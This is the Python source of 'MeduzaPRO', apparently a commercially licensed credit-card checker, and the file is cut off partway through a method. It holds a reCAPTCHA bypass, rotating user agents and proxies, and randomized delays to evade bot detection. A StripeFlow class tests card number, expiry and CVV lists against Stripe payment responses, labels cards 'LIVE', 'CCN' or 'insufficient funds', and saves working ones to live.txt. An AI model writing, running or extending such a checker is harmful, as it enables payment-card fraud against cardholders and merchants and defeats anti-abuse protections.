import os

import sys

import time

from colorama import Fore, Style, init

import pyfiglet

import traceback

from pathlib import Path

from urllib.parse import quote_plus

from concurrent.futures import ThreadPoolExecutor, as_completed

from threading import Lock

from tqdm import tqdm

from collections import defaultdict

from enum import Enum, auto

import urllib3

from urllib3.exceptions import InsecureRequestWarning

urllib3.disable_warnings(InsecureRequestWarning)

from faker import Faker

from requests.exceptions import (
    ProxyError,
    SSLError,
    ConnectionError,
    Timeout,
    HTTPError,
    TooManyRedirects,
    ChunkedEncodingError,
    ContentDecodingError,
    InvalidURL,
    InvalidSchema,
    RequestException,
)

import requests, hashlib, uuid, string, re, random, base64, ssl, secrets, platform, urllib3, threading, subprocess, socket, json

from datetime import datetime, timezone

from urllib.parse import urlparse, parse_qs

from http.cookiejar import LWPCookieJar, MozillaCookieJar

from urllib.parse import parse_qsl, urlencode

from typing import Any, Dict, Optional, Tuple, Union, List

socketio: Any = None

try:

    import socketio as _socketio

    socketio = _socketio

except Exception:

    pass


try:

    from fake_useragent import UserAgent

except Exception:

    pass


init(autoreset=True)


proxy_lock = Lock()

print_lock = Lock()


def safe_print(*args, **kwargs):

    text = " ".join(str(a) for a in args)

    end = kwargs.get("end", "\n")

    with print_lock:

        sys.stdout.write(text + end)

        sys.stdout.flush()


RESET = "\033[0m"

WHITE = "\033[97m"

GRAY = "\033[90m"

RED = "\033[91m"

GREEN = "\033[92m"

YELLOW = "\033[93m"


RED = Fore.RED or "\033[31m"

GREEN = Fore.GREEN or "\033[32m"

WHITE = Fore.WHITE or "\033[37m"

YELLOW = Fore.YELLOW or "\033[33m"

BLACK = Fore.BLACK or "\033[30m"

CYAN = Fore.CYAN or "\033[36m"

BLUE = Fore.BLUE or "\033[34m"

MAGENTA = Fore.MAGENTA or "\033[35m"


LRED = Fore.LIGHTRED_EX or "\033[91m"

LGREEN = Fore.LIGHTGREEN_EX or "\033[92m"

LWHITE = Fore.LIGHTWHITE_EX or "\033[97m"

LYELLOW = Fore.LIGHTYELLOW_EX or "\033[93m"

LBLACK = Fore.LIGHTBLACK_EX or "\033[90m"

LCYAN = Fore.LIGHTCYAN_EX or "\033[96m"

LBLUE = Fore.LIGHTBLUE_EX or "\033[94m"

LMAGENTA = Fore.LIGHTMAGENTA_EX or "\033[95m"


RESET = Style.RESET_ALL or "\033[0m"


banner1 = rf"""{Fore.LIGHTCYAN_EX}

          __________________

        .-'  \ _.-''-._ /  '-.

      .-/\   .'.      .'.   /\-.

     _'/  \.'   '.  .'   './  \'_

    :======:======::======:======:

     '. '.  \     ''     /  .' .'     {Fore.LIGHTRED_EX} MeduzaPRO{Fore.LIGHTCYAN_EX}

       '. .  \   :  :   /  . .'  {Fore.LIGHTYELLOW_EX}github.com/KianSantang777{Fore.LIGHTCYAN_EX}

         '.'  \  '  '  /  '.'     {Fore.LIGHTRED_EX}@xqndrs - @xqndrs66{Fore.LIGHTCYAN_EX}

           ':  \:    :/  :'

             '. \    / .'

               '.\  /.'

                 '\/'

    {LWHITE}------------------------------------------------------------------{RESET}"""


banner = rf"""{Fore.LIGHTRED_EX}              _________________      ____         __________

 .       .    /                 |    /    \    .  |          \

     .       /    ______   _____| . /      \      |    ___    |     .     .

             \    \    |   |       /   /\   \     |   |___>   |

           .  \    \   |   |      /   /__\   \  . |         _/             .

 .     ________>    |  |   | .   /            \   |   |\    \_______    .

      |            /   |   |    /    ______    \  |   | \           |

      |___________/    |___|   /____/      \____\ |___|  \__________|    .

  .     ____    __  . _____   ____      .  __________   .  _________

       \    \  /  \  /    /  /    \       |          \    /         |      .

        \    \/    \/    /  /      \      |    ___    |  /    ______|  .

         \              /  /   /\   \ .   |   |___>   |  \    \

   .      \            /  /   /__\   \    |         _/.   \    \

           \    /\    /  /            \   |   |\    \______>    |   .

            \  /  \  /  /    ______    \  |   | \              /          .

 .       .   \/    \/  /____/      \____\ |___|  \____________/  LS{Style.RESET_ALL}

                               .

             - MeduzaPro - Kian Santang DEV - T.ME/XQNDRS -

    {LWHITE}------------------------------------------------------------------{RESET}"""


BASE_DIR = Path(__file__).resolve().parent

RESULT_DIR = Path("results")

lock = Lock()

live_counter = {}


VERIFY_URL = os.getenv("LICENSE_VERIFY_URL", "https://verif.stecu.cloud/api/verify")

SOCKET_URL = os.getenv("LICENSE_SOCKET_URL", "https://verif.stecu.cloud")

LABEL = os.getenv("LICENSE_LABEL", "MEDUZAV3")

CACHE_FILENAME = "licenseKey.json"

HEARTBEAT_INTERVAL = 3

SOCKET_CONNECT_TIMEOUT = 30

REQUEST_TIMEOUT = 20


GLOBAL_PROXY = None


def safe_exit(code=1):

    try:

        os._exit(code)

    except Exception:

        sys.exit(code)


def clear():

    try:

        if os.name == "nt":

            os.system("cls")

        else:

            os.system("clear")

    except Exception:

        pass


def set_title(title: str):

    if os.name == "nt":

        import ctypes

        ctypes.windll.kernel32.SetConsoleTitleW(title)


def is_git_repo():

    try:

        p = subprocess.run(
            ["git", "rev-parse", "--is-inside-work-tree"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )

        return p.returncode == 0

    except Exception:

        return False


def auto_git_pull():

    try:

        if not is_git_repo():

            return

        old = subprocess.run(
            ["git", "rev-parse", "HEAD"], stdout=subprocess.PIPE, stderr=subprocess.PIPE
        ).stdout.strip()

        subprocess.run(
            ["git", "pull", "--rebase"], stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )

        new = subprocess.run(
            ["git", "rev-parse", "HEAD"], stdout=subprocess.PIPE, stderr=subprocess.PIPE
        ).stdout.strip()

        if old != new:

            os.execv(sys.executable, [sys.executable] + sys.argv)

    except Exception:

        pass


class Spinner:

    def __init__(self, text: str):

        self.text = text

        self.stop_flag = threading.Event()

        self.t = threading.Thread(target=self.run, daemon=True)

    def start(self):

        try:

            self.t.start()

        except Exception:

            pass

    def stop(self):

        try:

            self.stop_flag.set()

            if self.t.is_alive():

                self.t.join(timeout=1)

            print("\r".ljust(80), end="\r")

        except Exception:

            pass

    def run(self):

        frames = ["-", "\\", "|", "/"]

        i = 0

        while not self.stop_flag.is_set():

            try:

                print(f"\r{GRAY}{frames[i % 4]}{RESET} {self.text}", end="", flush=True)

                time.sleep(0.1)

                i += 1

            except Exception:

                break


class LicenseClient:

    def __init__(self):

        self.label = LABEL

        self.verify_url = VERIFY_URL

        self.socket_url = SOCKET_URL

        self.device_id = self._device_id()

        self.license_key: Optional[str] = None

        self.info = {}

        self.sio = None

        self.stop_flag = threading.Event()

    def authenticate(self) -> bool:

        if not self.verify():

            return False

        self.start_socket()

        clear()

        self.print_info()

        return True

    def _device_id(self):

        try:

            raw = f"{platform.system()}::{platform.machine()}::{platform.node()}::{uuid.getnode()}"

            h = hashlib.sha1(raw.encode()).hexdigest()[:16].upper()

            return f"{platform.system()[:3].upper()}-{h}"

        except Exception:

            return "UNK-" + uuid.uuid4().hex[:12].upper()

    def _cache_path(self):

        try:

            if os.name == "nt":

                base = (
                    os.getenv("LOCALAPPDATA")
                    or os.getenv("APPDATA")
                    or str(Path.home())
                )

            else:

                base = os.getenv("XDG_CACHE_HOME") or str(Path.home() / ".cache")

            base = Path(base) / "license_client"

            base.mkdir(parents=True, exist_ok=True)

            return str(base / CACHE_FILENAME)

        except Exception:

            return CACHE_FILENAME

    def _load_cache(self):

        try:

            p = self._cache_path()

            if not os.path.exists(p):

                return None

            with open(p, "r", encoding="utf-8") as f:

                data = json.load(f)

                return data.get("license")

        except Exception:

            return None

    def _save_cache(self, key: str):

        try:

            p = self._cache_path()

            tmp = p + ".tmp"

            with open(tmp, "w", encoding="utf-8") as f:

                json.dump({"license": key}, f)

            os.replace(tmp, p)

        except Exception:

            pass

    def _clear_cache(self):

        try:

            os.remove(self._cache_path())

        except Exception:

            pass

    def _verify(self, key: str) -> dict:

        try:

            r = requests.post(
                self.verify_url,
                json={
                    "license_key": key,
                    "label": self.label,
                    "device_id": self.device_id,
                },
                headers={
                    "User-Agent": self.device_id,
                    "Content-Type": "application/json",
                },
                timeout=REQUEST_TIMEOUT,
            )

            if r.status_code != 200:

                return {"valid": False, "error": f"HTTP {r.status_code}"}

            try:

                data = r.json()

            except Exception:

                return {"valid": False, "error": "Invalid JSON"}

            if not isinstance(data, dict):

                return {"valid": False, "error": "Invalid response"}

            return data

        except requests.exceptions.Timeout:

            return {"valid": False, "error": "Timeout"}

        except requests.exceptions.ConnectionError:

            return {"valid": False, "error": "Connection error"}

        except Exception as e:

            return {"valid": False, "error": str(e)}

    def _apply(self, key: str, r: dict):

        lic = r.get("license") or {}

        self.license_key = key

        self.info = {
            "name": lic.get("name", "-"),
            "status": lic.get("status", "-"),
            "expires": lic.get("expires_at") or lic.get("expired_at") or "-",
        }

    def verify(self) -> bool:

        clear()

        print(WHITE + "License verification\n" + RESET)

        print(f"Product   : {self.label}")

        print(f"Device ID : {self.device_id}\n")

        cached = self._load_cache()

        if cached:

            sp = Spinner("Verifying saved license")

            sp.start()

            r = self._verify(cached)

            sp.stop()

            if r.get("valid") is True:

                self._apply(cached, r)

                return True

            self._clear_cache()

        for _ in range(3):

            try:

                print(GRAY + "Need help? Telegram: @xqndrs - @xqndrs66" + RESET)

                key = input(WHITE + "License key: " + RESET).strip().upper()

                if not key:

                    continue

                sp = Spinner("Verifying license")

                sp.start()

                r = self._verify(key)

                sp.stop()

                if r.get("valid") is True:

                    self._apply(key, r)

                    self._save_cache(key)

                    return True

                print(RED + f"Invalid license: {r.get('error')}\n" + RESET)

            except KeyboardInterrupt:

                print("\nAborted")

                return False

            except Exception:

                print(RED + "Verification error" + RESET)

        return False

    def start_socket(self):

        if socketio is None:

            print(RED + "socketio not installed, realtime protection disabled" + RESET)

            return

        def loop():

            try:

                sio = socketio.Client(
                    reconnection=True, reconnection_attempts=0, reconnection_delay=2
                )

                self.sio = sio

                @sio.event
                def connect():

                    sio.emit(
                        "register_device",
                        {"license_key": self.license_key, "device_id": self.device_id},
                    )

                def kicked(_=None):

                    self._clear_cache()

                    print(RED + "\nDevice kicked by administrator. Exiting." + RESET)

                    safe_exit(1)

                for e in (
                    "device_kicked",
                    "device_kicked_target",
                    "license_disabled",
                    "license_deleted",
                    "kick_oldest",
                    "enforce_limit",
                ):

                    sio.on(e, kicked)

                sio.connect(self.socket_url, wait_timeout=SOCKET_CONNECT_TIMEOUT)

                while not self.stop_flag.is_set():

                    try:

                        sio.emit(
                            "heartbeat",
                            {
                                "license_key": self.license_key,
                                "device_id": self.device_id,
                                "ts": int(time.time()),
                                "status": "online",
                            },
                        )

                    except Exception:

                        pass

                    time.sleep(HEARTBEAT_INTERVAL)

            except Exception:

                print(RED + "Socket disabled" + RESET)

        threading.Thread(target=loop, daemon=True).start()

    def print_info(self):

        name = self.info.get("name", "-")

        status = self.info.get("status", "-").upper()

        exp = self.info.get("expires", "-")

        color = GREEN if status == "ACTIVE" else RED

        print(
            f"     {WHITE}{name}{RESET} | "
            f"{YELLOW}{self.label}{RESET} | "
            f"{color}{status}{RESET} | "
            f"{GRAY}Exp: {exp}{RESET}"
        )

    def run(self):

        try:

            if not self.verify():

                safe_exit(1)

            self.start_socket()

            clear()

            self.print_info()

            while True:

                time.sleep(1)

        except KeyboardInterrupt:

            pass

        except Exception:

            print(RED + "Fatal error" + RESET)

            traceback.print_exc()

        finally:

            self.stop_flag.set()


def smooth_delay(min_delay=2, max_delay=10):

    if min_delay >= max_delay:

        raise ValueError

    base_delay = (min_delay + max_delay) / 2

    jitter_range = (max_delay - min_delay) / 2

    jitter = random.uniform(-jitter_range, jitter_range)

    delay = base_delay + jitter

    delay = max(min_delay, min(max_delay, delay))

    time.sleep(delay)


USA = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.71",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.71",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.71",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.71",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.71",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36 Edg/98.0.1108.62",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36 Edg/98.0.1108.62",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.71",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.71",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36 Edg/98.0.1108.62",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0",
]


class RecaptchaSolver:

    BASE = "https://www.google.com/recaptcha"

    HEADERS = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/120.0.0.0 Safari/537.36"
        ),
    }

    RE_API = re.compile(r"(api2|enterprise)/anchor\?(.*)")

    RE_C = re.compile(r'value="([^"]+)"')

    RE_TOKEN = re.compile(r'"rresp","([^"]+)"')

    def __init__(
        self,
        proxies: Optional[List[str]] = None,
        cookie_file: Optional[str] = None,
        timeout: int = 10,
        retry: int = 3,
    ):

        self.proxies = proxies or []

        self.timeout = timeout

        self.retry = retry

        self.session = requests.Session()

        self.session.headers.update(self.HEADERS)

        self.cookie_jar = None

        if cookie_file:

            self.cookie_jar = MozillaCookieJar(cookie_file)

            try:

                self.cookie_jar.load(ignore_discard=True, ignore_expires=True)

                self.session.cookies.update(self.cookie_jar)

            except Exception:

                pass

        self._last_params = None

        self._last_c = None

    # ================= PUBLIC =================

    def solve(self, anchor_url: str) -> str:

        api, params = self._parse_anchor(anchor_url)

        proxy = self._proxy()

        anchor_html = self._request(
            "GET",
            f"{self.BASE}/{api}/anchor",
            params=params,
            proxy=proxy,
        )

        c_value = self._extract(self.RE_C, anchor_html, "c")

        self._last_params = params

        self._last_c = c_value

        payload = self._build_payload(params, c_value)

        reload_html = self._request(
            "POST",
            f"{self.BASE}/{api}/reload",
            params={"k": params["k"]},
            data=payload,
            proxy=proxy,
        )

        self._save_cookies()

        return self._extract(self.RE_TOKEN, reload_html, "token")

    def solve_any(self, url: str) -> str:

        if "/anchor" in url:

            return self.solve(url)

        if "/reload" not in url:

            raise ValueError("Unsupported recaptcha url")

        if not self._last_params or not self._last_c:

            raise RuntimeError("Reload requires prior anchor request")

        query = dict(parse_qsl(url.split("?", 1)[1]))

        k = query.get("k")

        if not k:

            raise ValueError("Missing site key")

        proxy = self._proxy()

        payload = self._build_payload(self._last_params, self._last_c)

        reload_html = self._request(
            "POST",
            url,
            params={"k": k},
            data=payload,
            proxy=proxy,
        )

        self._save_cookies()

        return self._extract(self.RE_TOKEN, reload_html, "token")

    # ================= INTERNAL =================

    def _parse_anchor(self, url: str) -> Tuple[str, dict]:

        m = self.RE_API.search(url)

        if not m:

            raise ValueError("Invalid recaptcha anchor url")

        api = m.group(1)

        params = dict(parse_qsl(m.group(2)))

        required = ("k", "v", "co")

        for r in required:

            if r not in params:

                raise ValueError(f"Missing param: {r}")

        return api, params

    @staticmethod
    def _build_payload(p: dict, c: str) -> str:

        return urlencode(
            {
                "v": p["v"],
                "reason": "q",
                "c": c,
                "k": p["k"],
                "co": p["co"],
            }
        )

    @staticmethod
    def _extract(regex: re.Pattern, text: str, name: str) -> str:

        m = regex.search(text)

        if not m:

            raise RuntimeError(f"Extraction failed: {name}")

        return m.group(1)

    def _proxy(self):

        if not self.proxies:

            return None

        p = random.choice(self.proxies)

        if p.startswith("http"):

            return {"http": p, "https": p}

        return {
            "http": f"http://{p}",
            "https": f"http://{p}",
        }

    def _request(
        self,
        method: str,
        url: str,
        *,
        params=None,
        data=None,
        proxy=None,
    ) -> str:

        last_error = None

        for i in range(self.retry):

            try:

                r = self.session.request(
                    method,
                    url,
                    params=params,
                    data=data,
                    proxies=proxy,
                    timeout=self.timeout,
                )

                r.raise_for_status()

                return r.text

            except Exception as e:

                last_error = e

                time.sleep(0.8 + random.random() * 1.2)

        raise RuntimeError(f"{method} request failed: {last_error}")

    def _save_cookies(self):

        if not self.cookie_jar:

            return

        try:

            for c in self.session.cookies:

                self.cookie_jar.set_cookie(c)

            self.cookie_jar.save(ignore_discard=True, ignore_expires=True)

        except Exception:

            pass


class FlowResult(Enum):

    LIVE = auto()

    LIVE_CCN = auto()

    DECLINED = auto()

    THREE_DS = auto()

    UNKNOWN = auto()


class ResponseNormalizer:

    @staticmethod
    def normalize(resp: Any) -> Dict[str, Any]:

        if not isinstance(resp, dict):

            return {}

        data = resp.get("data")

        if isinstance(data, dict):

            return data

        return resp


class StripeFlow:

    def __init__(self, session=None, Auswitch: str = "Mozilla/5.0"):

        self.session = session or requests.Session()

        self.Auswitch = Auswitch

    def _clean(self, s: Optional[str]) -> str:

        s = (s or "UNKNOWN").strip()

        while "  " in s:

            s = s.replace("  ", " ")

        return s

    def _get_bin_info(self, bincc: str) -> str:

        try:

            headers = {
                "User-Agent": self.Auswitch,
                "Accept": "application/json",
                "Accept-Version": "3",
            }

            r = self.session.get(
                f"https://binlist.io/lookup/{bincc}",
                headers=headers,
                timeout=20,
                verify=False,
            )

            data = r.json() if isinstance(r.json(), dict) else {}

            scheme = self._clean(data.get("scheme"))

            ctype = self._clean(data.get("type"))

            category = self._clean(data.get("category"))

            country = data.get("country") or {}

            alpha = self._clean(country.get("alpha3") or country.get("alpha2"))

            bank = data.get("bank") or {}

            bank_name = self._clean(bank.get("name"))

            return f"{scheme}|{ctype}|{category}|{alpha}|{bank_name}"

        except Exception:

            return "UNKNOWN|UNKNOWN|UNKNOWN|UNKNOWN|UNKNOWN"

    @staticmethod
    def _parse_model_response(data: Any) -> Tuple[Optional[bool], Optional[str]]:

        if not isinstance(data, dict):

            return None, None

        success = data.get("success")

        inner = data.get("data")

        if isinstance(inner, dict):

            error = inner.get("error")

            if isinstance(error, dict):

                msg = error.get("message")

                if isinstance(msg, str):

                    msg = msg.replace("Error:", "").strip()

                    return success, msg

        return success, None

    def handle(self, data, cc_num, mm, yy, cvv, filename: str = "live.txt") -> bool:

        card = f"{cc_num}|{mm}|{yy}|{cvv}"

        bincc = cc_num[:6]

        info = self._get_bin_info(bincc)

        # ---- custom model response parsing ----

        success, model_msg = self._parse_model_response(data)

        if success is False and model_msg:

            safe_print(
                f"  {card} --> {Fore.RED}CARD_DECLINED{Style.RESET_ALL} | {model_msg}"
            )

            return False

        intent = self._extract_intent(data)

        status = self._safe_get(intent, "status")

        next_action = intent.get("next_action") if isinstance(intent, dict) else None

        error = self._extract_error(data, intent)

        msg, reason = self._build_reason(error)

        if status == "succeeded":

            safe_print(f"  {card} --> {Fore.GREEN}LIVE{Style.RESET_ALL} | Approved.")

            with open(filename, "a", encoding="utf-8") as f:

                f.write(card + f"|SUCCEEDED|{info}\n")

            return True

        if msg and "you cannot add a new payment method so soon" in msg.lower():

            safe_print(f"  {card} --> {Fore.YELLOW}RATE_LIMIT{Style.RESET_ALL} | {msg}")

            return False

        if status == "requires_payment_method":

            return self._handle_requires_payment_method(
                card, cc_num, msg, reason, filename
            )

        if status == "requires_action":

            safe_print(
                f"  {card} --> {Fore.YELLOW}3DS{Style.RESET_ALL} | Three3ds secure"
            )

            return False

        if error:

            self._print_declined(card, msg)

            return False

        safe_print(
            f"  {card} --> {Fore.RED}CARD_DECLINED{Style.RESET_ALL} | {msg or 'Unknown error'}"
        )

        return False

    def _handle_requires_payment_method(
        self,
        card: str,
        cc_num: str,
        msg: Optional[str],
        reason: str,
        filename: str = "live.txt",
    ) -> bool:

        bincc = cc_num[:6]

        info = self._get_bin_info(bincc)

        if (
            "Your card has insufficient funds." in reason
            or "insufficient_funds" in reason
        ):

            safe_print(
                f"  {card} --> {Fore.GREEN}LIVE{Style.RESET_ALL} | insufficient_funds"
            )

            with open(filename, "a", encoding="utf-8") as f:

                f.write(card + f"|INSUFFICIENT_FUNDS|{info}\n")

            return True

        if (
            "Your card's security code is incorrect" in reason
            or "incorrect_cvc" in reason
        ):

            safe_print(
                f"  {card} --> {Fore.GREEN}LIVE CCN{Style.RESET_ALL} | incorrect_cvc"
            )

            with open(filename, "a", encoding="utf-8") as f:

                f.write(card + f"|CCN APPROVED|{info}\n")

            return True

        if any(
            k in reason for k in ("authentication", "three_d", "3d", "requires_action")
        ):

            safe_print(
                f"  {card} --> {Fore.YELLOW}3DS{Style.RESET_ALL} | Three3ds secure"
            )

            return False

        self._print_declined(card, msg)

        return False

    @staticmethod
    def _print_declined(card: str, msg: Optional[str]) -> None:

        if msg:

            safe_print(f"  {card} --> {Fore.RED}CARD_DECLINED{Style.RESET_ALL} | {msg}")

        else:

            safe_print(f"  {card} --> {Fore.RED}CARD_DECLINED{Style.RESET_ALL}")

    @staticmethod
    def _extract_intent(data: Any) -> Dict[str, Any]:

        if not isinstance(data, dict):

            return {}

        error = data.get("error")

        if isinstance(error, dict):

            for key in ("payment_intent", "setup_intent"):

                if isinstance(error.get(key), dict):

                    return error[key]

        for key in ("payment_intent", "setup_intent", "data"):

            if isinstance(data.get(key), dict):

                return data[key]

        return data

    @staticmethod
    def _extract_error(
        data: Any,
        intent: Dict[str, Any],
    ) -> Optional[Dict[str, Any]]:

        if isinstance(data, dict):

            inner = data.get("data")

            if isinstance(inner, dict):

                err = inner.get("error")

                if isinstance(err, dict):

                    return err

        if isinstance(data, dict):

            err = data.get("error")

            if isinstance(err, dict):

                return err

        if isinstance(intent, dict):

            for key in ("last_payment_error", "last_setup_error"):

                err = intent.get(key)

                if isinstance(err, dict):

                    return err

        return None

    @staticmethod
    def _build_reason(err: Optional[Dict[str, Any]]) -> Tuple[Optional[str], str]:

